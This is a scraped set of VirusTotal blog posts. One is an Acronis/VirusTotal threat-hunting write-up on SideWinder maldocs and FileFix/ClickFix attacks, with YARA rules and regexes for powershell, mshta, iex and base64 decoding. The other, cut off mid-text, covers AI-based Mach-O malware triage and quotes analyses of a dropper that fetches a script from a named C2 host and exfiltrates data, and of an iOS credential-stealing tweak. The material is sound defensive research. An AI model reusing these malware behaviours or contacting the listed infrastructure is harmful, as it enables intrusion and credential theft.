campaign targeting Colombian entities that embedded judicial lures and external payload links within SVG images. By correlating samples with metadata filters such as submitter:CO and targeted content searches for terms like href=\"https://\" and legal keywords, the team mapped an entire infection chain and its supporting infrastructure. Across all these efforts, VirusTotal provided a unified environment where Acronis could pivot, correlate, and validate findings in real time, transforming fragmented indicators into comprehensive, actionable intelligence.\n </div>\n\n\n<h1 style=\"text-align: left;\">Hunting Exploits Like It\u2019s 2017-0199 (SideWinder Edition)\n </h1>\n<div class=\"interval_12\"><a href=\"https://attack.mitre.org/groups/G0121/\" target=\"_blank\">SideWinder is a well-known threat actor</a> that keeps going back to what works. Their document-based delivery chain has been active for years, and the group continues to rely on the same proven exploits to <a href=\"https://www.acronis.com/en/tru/posts/from-banks-to-battalions-sidewinders-attacks-on-south-asias-public-sector/\" target=\"_blank\">target government and defense entities across South Asia</a>. Our goal in this hunt was to get beyond just finding samples. We wanted to understand where new documents were surfacing, who they were likely aimed at, and what types of decoys were in circulation during the latest campaign wave. VirusTotal gave us the visibility we needed to do that efficiently and at scale.\n </div>\n<div class=\"interval_12\">We started by digging into Microsoft Office and RTF files recently uploaded to VirusTotal that were tagged with <a href=\"https://docs.virustotal.com/docs/writing-yara-rules-for-livehunt\" target=\"_blank\">CVE-2017-0199</a> or <a href=\"https://www.virustotal.com/gui/search/tag%253ACVE-2017-11882?type=files\" target=\"_blank\">CVE-2017-11882</a> and coming from Pakistan, Bangladesh, Sri Lanka, and neighboring countries. <a href=\"https://docs.virustotal.com/docs/writing-yara-rules-for-livehunt\" target=\"_blank\">By filtering based on VT metadata such as submitter country and file type</a>, and by excluding obvious noise from bulk submissions or unrelated activity, we could narrow our focus to the samples that actually fit SideWinder\u2019s operational profile.\n </div>\n<div class=\"interval_12\"><pre>\n/*\n    Checks if the file is tagged with CVE-2017-0199 or CVE-2017-11882\n    and originates from one of the targeted countries\n    and the file type is a Word document, RTF, or MS-Office file\n*/\nimport \"vt\"\nrule hunting_cve_maldocs {\n    meta:\n        author = \"Acronis Threat Research Unit (TRU)\"\n        description = \"Hunting for malicious Word/RTF files exploiting CVE-2017-0199 or CVE-2017-11882 from specific countries\"\n        distribution = \"TLP:CLEAR\"\n        version = \"1.2\"\n\n    condition:\n        // Match if the file has CVE-2017-0199 or CVE-2017-11882 in the tags\n        for any tag in vt.metadata.tags : \n        ( \n            tag == \"cve-2017-0199\" or \n            tag == \"cve-2017-11882\" \n        )\n        // Originates from a specific country?\n        and \n        (\n            // Removed CN due to spam submissions of related maldocs\n            vt.metadata.submitter.country == \"PK\" or \n            vt.metadata.submitter.country == \"LK\" or \n            vt.metadata.submitter.country == \"BD\" or \n            vt.metadata.submitter.country == \"NP\" or \n            vt.metadata.submitter.country == \"MM\" or \n            vt.metadata.submitter.country == \"MV\" or \n            vt.metadata.submitter.country == \"AF\"\n        )\n        // Is it a DOC, DOCX, or RTF?\n        and \n        (\n            vt.metadata.file_type == vt.FileType.DOC or\n            vt.metadata.file_type == vt.FileType.DOCX or\n            vt.metadata.file_type == vt.FileType.RTF\n        )\n        // Different TA spotted using .ru TLD (excluding it for now)\n        and not (\n            for any url in vt.behaviour.memory_pattern_urls : (\n                url contains \".ru\"\n            )\n        )\n        and vt.metadata.new_file\n} </pre> </div>\n<div class=\"interval_12\">Next, we began translating those results into new livehunt rules. The initial version was intentionally broad: match any new document exploiting those CVEs, uploaded from a small list of countries of interest, and restricted to document file types like DOC, DOCX, or RTF. We also added logic to avoid hits that didn\u2019t fit SideWinder\u2019s patterns, such as samples calling out .ru infrastructure tied to other known threat clusters.\n </div>\n<div

One concrete example is the spear phish titled <a href=\"https://www.virustotal.com/gui/file/40fc70e61157b3903a7517b9928c87784070af59d533cdbae5ca2d4d7cbb45ac/behavior\" target=\"_blank\">54th CISM World Military Naval Pentathlon 2025 - Invitation.eml</a>, indexed in VirusTotal with behavior metadata and attachments tied to the same infrastructure.\n </div>\n<div class=\"central_box interval_12\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhWtVVfaUi8Uvlxz-sihKFOii4XA88Zs-GNue0uoOM4_PmEO5SU3B_jN0MAr8k16zTSL-gvR2XXpYhXvO3IA8RgESUDx4Y4_nDCtBtabpVUdnoO1FGV-_cPFI8KQOtGwNyyWBoC14E3HV_0M5-D6Pcvv2yMZm6KlXD1ur5t3JFVxiX9IOocWIv4bwP2vCo\" /> </div>\n  <div class=\"figures centrar-texto\">Getting initial infection spear-phishing e-mails allowed us to put together the different pieces of the puzzle, from beginning to end\n</div>\n<div class=\"interval_12\">For other hunters, the key takeaway is that even older exploits like CVE-2017-0199 can reveal a lot when you combine multiple VirusTotal features. In this case, we used metadata, livehunt, and regional telemetry to connect seemingly unrelated samples. We also checked hashtags and community votes, including those from researchers like Joseliyo, to cross-check our assumptions and spot ongoing discussions about similar activity.

The first rule was broad, meant to surface related samples and reveal the full scope of the campaign. It proved useful in livehunt and retrohunt, helping us find clusters of judicial-themed SVGs and their linked payloads. As the investigation progressed, we focused on precision, reducing false positives and removing elements that did not add value. Tuning a rule is always a balance: removing one pattern might miss some samples, but it can also make the rule more accurate and easier to maintain.\n </div>\n  <h1 style=\"text-align: left;\">FileFix in the wild!\n </h1>\n  <div class=\"interval_12\">A few weeks ago, the <a href=\"https://www.acronis.com/en/tru/about/\" target=\"_blank\">TRU team</a> at Acronis <a href=\"https://www.acronis.com/en/tru/posts/filefix-in-the-wild-new-filefix-campaign-goes-beyond-poc-and-leverages-steganography/\" target=\"_blank\">released</a> research on a (at the time) rarely seen variant of the <a href=\"https://logpoint.com/en/blog/emerging-threats/clickfix-another-deceptive-social-engineering-technique\" target=\"_blank\">ClickFix</a> attack, called FileFix. Much of the investigation of this attack vector was possible thanks to VirusTotal\u2019s ability to archive, search, and write rules for finding web pages. We, at Acronis, together with VT, wanted to share a bit of information on how we did it- so that others can better research this type of emerging threat. \n </div>\n    <h2 style=\"text-align: left;\">Anatomy of an attack- where do we start? \n </h2>\n  <div class=\"interval_12\">Like many phishing attacks, <a href=\"https://attack.mitre.org/techniques/T1204/004/\" target=\"_blank\">*Fix attacks</a> rely on malicious websites where victims are tricked into running malicious commands. Lucky for us, these attacks have a few particular components that are in common to all, or many, *Fix attacks. Using VT, we were able to write rules and <a href=\"https://gtidocs.virustotal.com/docs/livehunt-guide\" target=\"_blank\">livehunt</a> for any new web pages which included these components, and were able to quickly reiterate on rules that were too broad. \n </div>\n<div class=\"interval_12\">One thing all *Fix attacks have in common, is that they copy a malicious command to the victims clipboard- copying the malicious command, rather than letting the user copy the command themselves, allows attackers to try to hide the malicious part of the command from the victim, and only allow for a smaller, \u201cbenign\u201d portion of the command to appear when they copy it into their Windows Run Dialogue or address bar. This commonality gives us two great strings to hunt for: \n </div>\n  <div class=\"interval_12\"><ul> <li>The commands used to copy text into the victims clipboard \n </li> <li>The commands used to construct the malicious payload \n </li> </ul> </div>\n<div class=\"central_box interval_12\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEikwqEwIpuR7k0vl4sp6CHlt6JOmGFjRSmInWDyW3e_LUbkEuQj1-o-ZaZ7qYXb9jF_GrzPj9mOHzdk8EXxQKwCQprxX61Mfm-LkjeAPjkKDRYCCyGPeq1-nHX8_3PKbEA4IU_SWns5UYOLuXL_E8X5M_AP6RVjWIukjplCj7GSEllkEkAUap4NSTjuRt8\" /> </div>\n  <div class=\"figures centrar-texto\"></div>\n<div class=\"interval_12\">We began our research by using the Livehunt feature, and wrote a rule to detect navigator.clipboard.writeText and document.execCommand(\"copy\"), both used for copying into clipboard, as well as any string including the words powershell, mshta, cmd, and other commands we find commonly used in *Fix attacks. At its most basic form, a rule might look like this:\n </div>\n<div class=\"interval_12\">\n  <pre>import \"vt\"\n\nrule ClickFix\n{\n  strings:\n    $clipboard = /(navigator\\.clipboard\\.writeText|document\\.execCommand\\(\\\"copy\\\"\\))/\n    $pay01 = /(powershell|cmd|mshta|msiexec|pwsh)/gvfi\n  condition:\n    vt.net.url.new_url and\n    $clipboard and\n    any of ($pay*)\n}  </pre>\n  </div>\n<div class=\"interval_12\">However, this is far from enough. There are plenty of benign sites that use the copy to clipboard feature, and also have the words powershell or cmd present (the three letters \u201ccmd\u201d appear often as part of Base64 strings). This makes things a bit more tricky, as it requires us to iron out these false positives. We need to make our patterns look more similar to real powershell or cmd commands. \n </div>\n<div class=\"interval_12\">Unfortunately, there is such a huge variance in how these commands are written, that the more rigid our patterns became, the more likely it was for us to miss a true positive that included something we haven\u2019t seen before or couldn\u2019t think of. This requires a balancing act- if your rules are too rigid, you will miss true positives that employ a creatively crafted command; too loose and you will receive a large number of false positives, which will slow down investigation. \n </div>\n<div class=\"interval_12\">For example, we can try narrowing down our rule to include more true positives of powershell commands by searching for a string that\u2019s better resembling some of the powershell commands we\u2019ve seen as part of a ClickFix payload, by including the \u201ciex\u201d cmdlet, which tells the powershell command to execute a command:\n </div>\n  <div class=\"interval_12\"> <pre>$pay03 = /powershell.{,80}iex/</pre></div>\n<div class=\"interval_12\">This will match whenever the word powershell appears, with the word iex appearing 0 to 80 characters after it. This should reduce the number of false positives we see related to powershell, as it more clearly resembles a powershell command, but at the same time limits our rule to only catch powershell commands that follow this structure- any true positive command with more than 80 characters between the word powershell and iex, or commands forgoing the use of iex, will not be caught.\n </div>\n<div class=\"interval_12\">We ended up setting a number of separate rulesets, some were more specific, others more generic. The more generic ones helped us tune our more specific rulesets. This tactic allowed us to find a large number of ClickFix attacks. Most were run of the mill fake captchas, leveraging ClickFix, others were more interesting. As we continued fine tuning our rules, and within a week of setting up our Livehunt, one of our more generic rules has made an interesting <a href=\"https://www.virustotal.com/gui/url/0c91dbdf806b35d57c332e71ff73c5e18ca86e1d1906099543698b3155c95ca7/content\" target=\"_blank\">detection</a>. At first glance, it appeared to be a false positive, but as we looked closer, we discovered that it\u2019s exactly what we were hoping to find- a FileFix attack.  \n </div>\n<h2 style=\"text-align: left;\">Analyzing payloads \n </h2>\n<div class=\"interval_12\">One of the nicest things about researching a *Fix attack is that the payload is right there on the website, right in plain site. This offers a few advantages- the first is that we can examine the payload even when the phishing site itself is down, as long as it\u2019s archived by VT. The second advantage is we can further search for similar patterns on VT via VT queries to try and catch other attacks from the same campaign.  \n </div>\n<div class=\"central_box interval_12\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEi-zgNpRPdIn9xP0JHT0bqXFJwtf5jUFYaWT52_SnMl39KfRCyhnKK1uDbgNMgUSNsF-E_zJ5CMjV0CoNtbXJ0w9NQbm7n-NgKdVLdAF7JBEc5rtJ8OCLXz22hu5MaYMGzpsUYDhjmVkgcwFUTEtORAJJpKtRE0I1Pr6GZiyBjMd4oaW5f09mXniEmyXjw\" /> </div>\n<div class=\"figures centrar-texto\">Payloads are visible directly in VT, by using the content tab on any suspected website (and in this case- obfuscated)</div>\n<div class=\"interval_12\">Often, these payloads may contain additional malicious urls which are used to download and execute additional payloads. These can also very easily be examined on VT, and any files they lead to may also be downloaded directly from VT.  \n </div>\n<div class=\"interval_12\">In our investigation of the FileFix site, we found that the payload (a powershell command) downloads an <a href=\"https://www.virustotal.com/gui/file/06471e1f500612f44c828e5d3453e7846f70c2d83b24c08ac9193e791f1a8130/detection\" target=\"_blank\">image</a>, and then runs a script that is embedded in the image file.

Well, we hope it can be helpful in a number of ways. \n </div>\n<div class=\"interval_12\">Firstly, working together as a community, it is important that we continue to catch and block URLs that are employing *Fix attacks. It\u2019s not easy to detect a *Fix site dynamically, and prevention may still happen in many cases after the payload has already been run. Maintaining a robust blocklist remains a very good and accessible option for stopping these threats. \n </div>\n<div class=\"interval_12\">Secondly, those of us interested in continuing to track this threat and follow its evolution may use this to find these threats and potentially automate detection. As a side note, *Fix attacks are great investigation topics for those of us starting out in security, and as long as appropriate precautions are taken, it can be relatively safely investigated via VT, and can be very useful for learning about malicious commands, phishing sites, etc. \n </div>\n<div class=\"interval_12\">Thirdly, for those of us protecting organizations, this can be a useful guide for finding these attacks by yourself, in the wild, in order to gain a deeper understanding of how they operate, and what relevant ways you can find to defend your organization, although there are certainly many reports written on the subject which would also come in handy. \n </div>\n  <h1 style=\"text-align: left;\">VT Tips (based on the success story)\n </h1>\n<div class=\"interval_12\"><i>[In the words of VirusTotal\u2026] </i></div>\n<div class=\"interval_12\">The Acronis team\u2019s investigation into FileFix, SideWinder, and ShadowVector is a goldmine of threat hunting techniques. Let\u2019s move beyond the narrative and extract some advanced, practical methods you can apply to your own hunts for web-based threats and multi-stage payloads.\n </div>\n  <h2 style=\"text-align: left;\">Supercharge Your Web-Content YARA Rules\n </h2>\n<div class=\"interval_12\">A simple YARA rule looking for clipboard commands and \"powershell\" is a good start, but attackers know this. You can significantly improve your detection rate by building rules that look for the context in which these commands appear.\n </div>\n<div class=\"interval_12\">Instead of a generic search, try focusing on the obfuscation and page structure common in these attacks. For instance, attackers often hide their malicious script inside other functions or encoded strings. Your YARA rules can hunt for the combination of a clipboard command and indicators of de-obfuscation functions like atob() (for Base64) or String.fromCharCode.\n </div>\n<div class=\"interval_12\">Combine content searches with URL metadata. The content modifier is also available for URLs, when you set the entity to url you can use the content modifier to search for strings within the URL content. For example, the next <a href=\"https://www.virustotal.com/gui/search/entity%253Aurl%2520(content%253A%2522navigator%252Eclipboard%252EwriteText%2522%2520or%2520content%253A%2522document%252EexecCommand(%255C%2522copy%255C%2522)%2522)%2520(content%253A%2522String%252EfromCharCode%2522%2520or%2520content%253A%2522atob%2522)?type=urls\" target=\"_blank\">query</a> can be useful to identify potential ClickFix URLs combining some of the findings shared by Acronis and potential strings used to avoid detections.\n </div>\n<div class=\"interval_12\"><pre>entity:url (content:\"navigator.clipboard.writeText\" or content:\"document.execCommand(\\\"copy\\\")\") (content:\"String.fromCharCode\" or content:\"atob\")</pre> </div>\n  <h2 style=\"text-align: left;\">Dissect Payloads with Advanced Content Queries\n </h2>\n<div class=\"interval_12\">When you find a payload, as Acronis did within the FileFix site's source code, your job has just begun. The next step is to find related samples. Attackers often reuse code, and even when they obfuscate their scripts, unique strings or logic patterns can give them away. Isolate unique, non-generic parts of the script. Look for:\n </div>\n<div class=\"interval_12\"><ul>\n  <li>Custom function names</li>\n  <li>Specific variable names</li>\n  <li>Uncommon comments</li>\n  <li>Unique sequences of commands or API calls</li>\n</ul> </div>\n<div class=\"interval_12\">Focus on the unobfuscated parts of the code. In the FileFix payload, the attackers might obfuscate the C2 domain, but the PowerShell command structure used to decode and run it could be consistent across samples. Use that structure as your pivot. For example, if a payload uses a specific combination of [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(...)), you can build a <a href=\"https://www.virustotal.com/gui/search/behavior%253A%2522%255BSystem%252EText%252EEncoding%255D%253A%253AUTF8%252EGetString(%255BSystem%252EConvert%255D%253A%253AFromBase64String(%2522?type=files\" target=\"_blank\">query</a> to find other files using that exact deobfuscation chain.\n </div>\n  <div class=\"interval_12\"><pre>behavior:\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"\n</pre> </div>\n  <h2 style=\"text-align: left;\">Don't forget about the infrastructure</h2>\n\n<div class=\"interval_12\">Acronis has been tracking SideWinder in a very intelligent way. Their experience with VirusTotal is evident. Most of our users use VirusTotal primarily for file analysis, but sometimes we forget that there are powerful features for tracking <a href=\"https://docs.virustotal.com/docs/nethunt\" target=\"_blank\">infrastructure through livehunt</a>.\n </div>\n<div class=\"interval_12\">In the SideWinder intrusions, there is a continuously monitored hash that corresponds to a <a href=\"https://www.virustotal.com/gui/file/1955c6914097477d5141f720c9e8fa44b4fe189e854da298d85090cbc338b35a/relations\" target=\"_blank\">\n  decoy file</a>, and this file is downloaded from different URLs. \n </div>\n<div class=\"central_box interval_12\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEjMuP4EthMDxdVIx8MXmNrp8lbS6gc43cQK_JjBKMuM6ny_ZTFIjGGwyp6XCy2EC7iZnQwNe93PrhpM1e1pWAPEsTxXFWqky5cqmwwa2JInaopr9poAm6b_Avo6tp6ul_mlDtQBEsDQYYvFb-Ia6UxcY-4C94NasM4pq0htPJscGT_AU4yZW1gzLeQMp6w\" /> </div>\n<div class=\"figures centrar-texto\">ITW URLs means that these URLs were downloading the file being studied, in this case the RTF decoy file\n</div>\n<div class=\"interval_12\">An interesting way to proactively identify new URLs quickly is by creating a YARA rule in livehunt for URLs, where the objective is to discover new URLs that are downloading that specific RTF decoy file.\n </div>\n<div class=\"interval_12\"><pre>import \"vt\"\n\nrule URLs_Downloading_Decoy_RTF_SideWinder {\n\n  meta:\n    target_entity = \"url\"\n    author = \"Virustotal\"\n    description = \"This YARA rule identify new URLs downloading the decoy file related to SideWinder\"\n\n  condition:\n    vt.net.url.downloaded_file.sha256 == \"1955c6914097477d5141f720c9e8fa44b4fe189e854da298d85090cbc338b35a\" \n    and vt.net.url.new_url\n}</pre> </div>\n<div class=\"interval_12\">Another approach that could also be interesting is to directly query the <a href=\"https://gtidocs.virustotal.com/reference/file-object#relationships:~:text=IP%20addresses.-,itw_urls,-In%20the%20wild\" target=\"_blank\">itw_urls relationship</a> of the decoy file using the API. One use case could be creating a script that regularly (perhaps daily) calls the relationship API, retrieves the URLs, stores them in a database, and then repeats the call each day to identify new URLs. It's a simple, yet effective way to integrate with technology that any company might already have.\n </div>\n<div class=\"interval_12\">The following code snippet can be executed in <a href=\"https://colab.sandbox.google.com/\" target=\"_blank\">\n  Google Colab</a> and once you establish the API Key, you will obtain all the itw_urls related to the decoy file in the all_itw_urls variable.\n </div>\n<div class=\"interval_12\"><pre>!pip install vt-py nest_asyncio\nimport getpass, vt, json, nest_asyncio\nnest_asyncio.apply()\n\ncli = vt.Client(getpass.getpass('Introduce your VirusTotal API key: '))\n\nFILEHASH = \"1955c6914097477d5141f720c9e8fa44b4fe189e854da298d85090cbc338b35a\"\nRELATIONS = \"itw_urls\"\nall_itw_urls = []\n\nasync for itemobj in cli.iterator(f'/files/{FILEHASH}/{RELATIONS}', limit=0):\n    all_itw_urls.append(itemobj.to_dict())</pre> </div>\n  <h2 style=\"text-align: left;\">The great forgotten one: VT Diff\n </h2>\n<div class=\"interval_12\">When we read researchs using VT Diff, we are pleased, as it is a tool that is truly good for creating YARA rules.\n </div>\n<div class=\"interval_12\">When analyzing a set of related samples, use the VT Diff feature to spot commonalities and variations. This can help you identify patterns, such as repeated strings, hardcoded values, or metadata artifacts that indicate automated generation.\n </div>\n<div class=\"interval_12\">As the Acronis team notes, <i>\"We used the VT Diff functionality to compare variations between samples and quickly spot patterns, such as repeated words, hexadecimal values, URLs, or metadata tags that hinted at automated generation (i.e. the string \u201cGenerado Automaticamente\u201d)\"</i>.\n </div>\n<div class=\"interval_12\">You can easily use VT Diff from multiple places: intelligence search results, collections, campaigns, reports, VT Graph\u2026\n </div>\n<div class=\"central_box interval_12\"><img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEgW1fLRfxdwpgJmEXMMT7N9PXv73pPOV9kC-RdQ4j3guujVurnjYSFT_U6ENVeoWHGIWXwopXzntaM0grra0v6xskKXMAByqyf0IVSS-j_OQ13vY4pw4lDDZVVANOYF-vhBlTIqLSExSjVjyM341JM8SQh1U65FDiroODI_xxiGJItruqf5shKg_-1FeKg\" /> </div>\n  <div class=\"figures centrar-texto\">Creation of VT Diff from a <a href=\"https://www.virustotal.com/gui/collection/report--2692fe1070152501a8b85deacf45fb68444c00b42e6447e69c5e301f75ad3e43/iocs\" target=\"_blank\">Report</a>\n</div>\n  \n  \n  \n    <h1 style=\"text-align: left;\">Conclusion\n </h1>\n<div class=\"interval_12\">The examples shared by the Acronis Threat Research Unit in tracking campaigns like FileFix, SideWinder, and Shadow Vector demonstrates the power of VT as a comprehensive threat intelligence and hunting platform. By leveraging a combination of proactive Livehunt rules, deep content analysis, and rich metadata pivoting, security researchers can effectively uncover and track elusive and evolving threats.\n </div>\n<div class=\"interval_12\">These examples highlight that successful threat hunting is not just about having the right tools, but about applying creative and persistent investigation techniques. The ability to pivot from a simple YARA rule to a full-fledged campaign analysis, as Acronis did, is crucial to connecting the dots and revealing the full scope of an attack. From hunting for clipboard manipulation in web-based threats to tracking decade-old exploits and analyzing malicious SVG decoys, the Acronis team has demonstrated a deep understanding of modern threat hunting, and we appreciate them sharing their valuable insights with the community.\n </div>\n<div class=\"interval_12\">We hope this blog have been insightful and will help you in your own threat-hunting endeavors. The fight against cybercrime is a collective effort, and the more we share our knowledge and experiences, the stronger we become as a community.\n </div>\n<div class=\"interval_12\">If you have a success story of using VirusTotal that you would like to share with the community, <b>we would be delighted to hear from you</b>. Please reach out to us, and we will be happy to feature your story in a future blog post at <b>practitioners@virustotal.com</b>.\n </div>\n<div class=\"interval_12\">Together, we can make the digital world a safer place.\n </div>",

      "link": "https://blog.virustotal.com/2025/11/reversing-at-scale-ai-powered-malware.html",
      "summary": "<p><b>TL;DR:</b>\nWe ran our new AI-based Mach-O analysis pipeline in production, no metadata, no prior detections, just raw Apple binaries. On Oct 18, 2025, out of 9,981 first-seen samples, VT Code Insight surfaced multiple real Mac and iOS malware cases that had 0 antivirus detections at submission time, including a multi-stage AppleScript infostealer and an iOS credential-stealing tweak. It also helped identify 30 antivirus false positives, later confirmed and fixed.\n<p>\n<i>By Bernardo Quintero, Tom Bennett, and Paul Tarter</i>\n<p><b>The Challenge: Reversing at Scale</b></p>\n<p>The long-term goal of Code Insight is ambitious but simple to state: use AI to reason about every single file that reaches VirusTotal in real time. That\u2019s more than two million samples a day, so scalability and efficiency aren\u2019t nice-to-haves, they\u2019re requirements.</p>\n<p>We started this journey in early 2023 by analyzing small PowerShell scripts under 25 KB, focusing on fast, context-limited reasoning. As Gemini\u2019s token capacity grew, we expanded support to larger files and richer formats: Office documents with macros, PDFs containing embedded objects, and package types such as NPM, SWF, SVG, MCP, CRX, VSIX, etc. Each step pushed the boundaries of what Code Insight could interpret automatically.</p>\n<p>Eventually, we reached compiled binaries, by far the most challenging class due to their size, complexity, and low-level structure. Analyzing native code with large language models is not straightforward: Mach-O binaries can be massive, and full decompilation or disassembly often exceeds even the largest model contexts, while being too slow and expensive for a high-volume production pipeline.</p>\n<p>To make this feasible, we built a pruning-based summarization layer. Instead of feeding Gemini a full decompilation or noisy disassembly, we first extract the most informative elements: code entry points, key imports and exports, relevant strings, and selected function summaries, using <a href=\"https://binary.ninja/\">Binary Ninja</a>\u2019s High Level Intermediate Language (HLIL) for native code. The goal isn\u2019t to reconstruct the full program logic, but to preserve just enough structure for meaningful reasoning.</p>\n<p>This distilled representation fits comfortably within Gemini\u2019s 1M-token context window and allows us to generate a concise, human-readable analyst summary in a single LLM call, regardless of the binary\u2019s size. It\u2019s a pragmatic balance between depth and scalability, good enough to reason and perform a fast first-pass triage, yet efficient enough to keep up with the continuous flow of new files reaching VirusTotal every day.</p>\n<p><b>The 24-Hour Stress Test</b></p>\n<p>On October 18, 2025, VirusTotal received 9,981 unique Mach-O binaries never seen before by our platform. We ran every single one through our new Code Insight pipeline, using only the raw binary, no external metadata, no crowdsourced intelligence, and no previous antivirus results.</p>\n<p>Here\u2019s how the AI\u2019s fully independent analysis compared against the aggregate detections from more than 70 traditional antivirus engines on that same day:\n<ul>\n  <li>Traditional AV Detections: 67 binaries flagged as malicious by one or more engines.\n  <li>Code Insight Detections: 164 binaries identified as malicious.\n</ul>\n<p>The absolute numbers are interesting, but the real insight comes from the discrepancies between the two sets.</p>\n<p><b>Clearing the Fog: AI as a False Positive Filter</b></p>\n<p>Manual review confirmed that Code Insight\u2019s explanations were accurate:\n<ul>\n  <li>30 files were false positives from Microsoft\u2019s engine. Once reported, Microsoft promptly reviewed the cases, confirmed the issue, and updated their signatures on October 31. We appreciate their quick response.\n  <li>3 files were flagged by ClamAV with the signature <i>Macos.Trojan.CrackedTool</i>. While this label is technically correct within ClamAV\u2019s detection policy (it flags software signed by alternative markets such as MacKed), Code Insight correctly identified that these binaries did not exhibit inherently malicious behavior.\n</ul>\n<p>In a Security Operations Center setting, even a single false alert like this could consume hours of analyst time before being cleared. While VirusTotal operates at global scale and aggregates samples from many independent sources, the same pattern applies within any organization\u2019s network: unnecessary alerts create noise and drain resources. Code Insight demonstrated how AI reasoning can help triage these cases faster and more consistently, assisting rather than replacing human judgment.</p>\n<p><b>Finding the Needles: Zero-Day Detections</b></p>\n<p>Beyond filtering false positives, Code Insight also surfaced nearly 100 binaries that traditional engines had missed entirely at the time of analysis. Many of these were indeed suspicious, ranging from keygens and adware to grayware utilities with excessive privileges, such as certain developer e-learning tools or Roblox cheats often distributed outside the App Store.</p>\n<p>That said, not every \u201cmalicious\u201d verdict was black and white. Because Code Insight analyzes binaries in isolation, without context about their surrounding environment or intended use, it can occasionally err on the side of caution. For instance, one <a href=\"https://www.virustotal.com/gui/file/d9fd8b1d80a1b4fadfb42fe3b7b21eb37944eb9dd9507d030139893cc769e960/detection\">MCP component</a> from the Hopper decompiler was described accurately in terms of behavior (persistent XPC communication, JSON-based client\u2013server protocol, API-like command handlers) but was ultimately benign within its legitimate application context, as an MCP server rather than a malicious persistent C2 channel. In this case, we had an accurate technical description but a false positive in the final verdict issued by Code Insight.</p>\n<p>These occasional gray-area cases are part of the natural learning curve for AI-based reasoning systems. Still, the vast majority of Code Insight\u2019s findings were technically sound, and its detailed explanations allowed analysts to make quick, informed decisions based on actual capabilities rather than static signatures.</p>\n<p>Among those findings, we also identified several clear-cut cases of undetected malware, confirmed through manual reversing and reproducible behavior. Below we highlight two representative examples, one from macOS and another from iOS, both caught by AI yet completely invisible to traditional defenses on Day 0.</p>\n<p><b>1. Multi-stage macOS Dropper (0 Detections)</b></p>\n<p>SHA-256: <a href=\"https://www.virustotal.com/gui/file/9adef73a6255f6bcb203e84cbe9304d000f3c5354d3d7bf3fc3b2a0128b624c3/detection\">9adef73a6255f6bcb203e84cbe9304d000f3c5354d3d7bf3fc3b2a0128b624c3</a></p>\n<p>Code Insight immediately recognized this binary's hostile intent, describing it as a multi-stage threat. It didn't just flag it, it mapped the attack chain:</p>\n<p><i>\"The binary is a multi-stage malware that downloads and executes a second-stage AppleScript payload from a C2 server, and exfiltrates local data. It first connects to https://foggydoxz.xyz/dynamic to download an AppleScript, saves it to /tmp/test.scpt, and executes it using /usr/bin/osascript. Subsequently, it reads /tmp/osalogging.zip and exfiltrates it via a POST request to https://foggydoxz.xyz/gate. The malware also bypasses TLS certificate validation to secure its C2 communication.\"</i></p>\n<p>Manual reversing confirmed not only the verdict but every detail of this AI-generated assessment.</p>\n<center>\n<div class=\"separator\" style=\"clear: both;\"><a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqo5-cIbmFj9l0gU03LCjGulPFGd9wy3CIQN2au03P0QBNC6NwkElrzYQFfPwThyphenhyphenE2llmXcPASTbrkoPJpslnHV_eNJtuf-mzNze6e3UABC3H14eUnFLz85OuzmMlc5Zu2yVtP6bexZY2ycEhNafcf4ZCsFV345luNZS6HSXVA4rZunx0Q5F9z1k6H1t0/s1600/9adef.png\" style=\"display: block; padding: 1em 0; text-align: center;\"><img alt=\"\" border=\"0\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqo5-cIbmFj9l0gU03LCjGulPFGd9wy3CIQN2au03P0QBNC6NwkElrzYQFfPwThyphenhyphenE2llmXcPASTbrkoPJpslnHV_eNJtuf-mzNze6e3UABC3H14eUnFLz85OuzmMlc5Zu2yVtP6bexZY2ycEhNafcf4ZCsFV345luNZS6HSXVA4rZunx0Q5F9z1k6H1t0/s1600/9adef.png\" /></a></div>\n</center><br />\n<p>The screenshot above shows how detections for this sample evolved on VirusTotal over time. When it first arrived on October 18, no antivirus engine flagged it as malicious, yet Code Insight already identified it as a multi-stage macOS dropper. Over the following days, traditional detections gradually caught up: three engines marked it nine days later, and eleven by October 28. This pattern is common for truly novel threats: AI reasoning can expose suspicious behaviors before signatures or reputation systems are updated, offering analysts an early warning window that would otherwise not exist.</p>\n<p><b>2. iOS Jailbreak Tweak with a Phishing Twist (0 Detections)</b></p>\n<p>SHA-256: <a href=\"https://www.virustotal.com/gui/file/333913409c1e22b5da03c762cbb7d99a9d38ecdf0231cb9ac6db00efc6b3bd97/detection\">333913409c1e22b5da03c762cbb7d99a9d38ecdf0231cb9ac6db00efc6b3bd97</a></p>\n<p>This sample masquerades as a dynamic library for jailbroken iOS devices, claiming to unlock premium features in Adobe Lightroom. Code Insight looked beyond the piracy functionality and uncovered a secondary payload focused on credential theft.</p>\n<p>The AI correctly identified that it used method swizzling / hooking not only to bypass subscription checks but also to inject a fake login prompt. It highlighted obfuscation mechanisms used to conceal the exfiltration channel, including a hardcoded, obfuscated Telegram Bot API token and custom cryptographic routines to hide command strings.</p>\n<p>Code Insight\u2019s summary read:</p>\n<p><i>\"This is an iOS dynamic library (tweak) for jailbroken devices, designed to be injected into the Adobe Lightroom application process. Its primary purpose is to modify the target application's functionality. It exhibits several malicious behaviors: it uses method swizzling (e.g., `sub_41e564`) to hook functions, displays a custom UI overlay on top of the running application, and employs extensive string obfuscation and custom cryptographic routines (e.g., `sub_433b0c`, `sub_415b68`) to hide its functionality. Key IOCs include the installation path `/Library/MobileSubstrate/DynamicLibraries/Lightroom.dylib` and a URL to a Telegram channel (`https://t[.]me/blatants]`), likely used for C2 or distribution. These characteristics are consistent with malware designed for piracy, credential theft, or phishing within the context of the compromised host application.\"</i></p>\n<p>A manual reverse-engineering review by an expert confirmed, and expanded on the AI\u2019s assessment. The human analysis described the sample as a malicious dynamic library that functions as a dual-purpose tool: (1) it uses method hooking to bypass Lightroom\u2019s premium-feature checks (by replacing subscription validation routines to always return success), and (2) it implements a phishing capability that displays a convincing fake login prompt to capture Adobe credentials. The stolen credentials are then exfiltrated via an obfuscated Telegram Bot API token and Chat ID, with string 